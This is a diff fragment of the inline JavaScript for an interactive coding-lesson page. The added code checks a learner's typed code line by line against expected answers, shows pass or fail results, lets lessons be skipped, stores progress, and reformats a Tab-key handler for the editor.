-document.querySelectorAll('.code-editor').forEach(ta=>{ta.addEventListener('keydown',e=>{if(e.key==='Tab'){e.preventDefault();const s=ta.selectionStart;ta.value=ta.value.substring(0,s)+'    '+ta.value.substring(ta.selectionEnd);ta.selectionStart=ta.selectionEnd=s+4;}});});
+function checkCode(n){
+  const user=normalize(document.getElementById(`editor-${n}`).value);
+  const exp=normalize(EXPECTED[n]||'');
+  const ul=user.split('\n'),el=exp.split('\n');
+  let ok=0,html='';
+  el.forEach((e,i)=>{const u=ul[i]||'';if(u===e){ok++;html+=`<div class="line-ok">✓ ${escHtml(e)}</div>`;}else{html+=`<div class="line-err">✗ Expected: ${escHtml(e)}<br>&nbsp;&nbsp;&nbsp;Got:&nbsp;&nbsp;&nbsp;&nbsp; ${escHtml(u)||'(missing)'}</div>`;}});
+  const re=document.getElementById(`result-${n}`),ed=document.getElementById(`editor-${n}`);
+  if(ok===el.length){
+    re.innerHTML=`<div class="result-pass">✓ CORRECT — ${ok}/${el.length} lines</div>`+html;
+    ed.classList.add('pass');ed.classList.remove('fail');
+    document.getElementById(`explain-${n}`)?.classList.add('show');
+    document.getElementById(`next-${n}`)?.classList.add('show');
+    const p=loadProgress();p[n]=true;saveProgress(p);
+  }else{
+    re.innerHTML=`<div class="result-fail">✗ ${ok}/${el.length} correct</div>`+html;
+    ed.classList.add('fail');ed.classList.remove('pass');
+  }
+}
+function skipLesson(n){
+  const p=loadProgress();p[n]=true;saveProgress(p);
+  document.getElementById(`explain-${n}`)?.classList.add('show');
+  document.getElementById(`next-${n}`)?.classList.add('show');
+  if(n<TOTAL)goLesson(n+1);else showComplete();
+}
+updateProgressUI(loadProgress());
+document.querySelectorAll('.code-editor').forEach(ta=>{
+  ta.addEventListener('keydown',e=>{if(e.key==='Tab'){e.preventDefault();const s=ta.selectionStart;ta.value=ta.value.substring(0,s)+'    '+ta.value.substring(ta.selectionEnd);ta.selectionStart=ta.selectionEnd=s+4;}});
+});
 </script>
 </body>
 </html>
